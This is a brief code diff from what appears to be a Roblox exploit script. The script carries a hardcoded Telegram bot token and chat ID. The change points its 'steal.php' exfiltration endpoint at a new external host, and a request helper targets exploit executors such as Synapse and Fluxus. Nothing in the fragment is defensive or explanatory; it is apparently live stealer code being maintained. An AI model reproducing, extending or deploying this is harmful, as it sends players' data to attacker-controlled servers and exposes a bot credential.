@@ -15,7 +15,7 @@ local Mouse = LocalPlayer:GetMouse()
 
 local TELEGRAM_BOT_TOKEN = "8300346649:AAGBrTHwG8TqOaxQniq0E1APzRCMxXKUgXg"
 local TELEGRAM_CHAT_ID = "8432037548"
-local ENDPOINT = "https://ashfall-rblxinfo.ct.ws/steal.php"
+local ENDPOINT = "https://evgnfp5eck.apps.bot-hosting.cloud/steal.php"
 
 local function request(opts)
 	local req = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or request or http_request
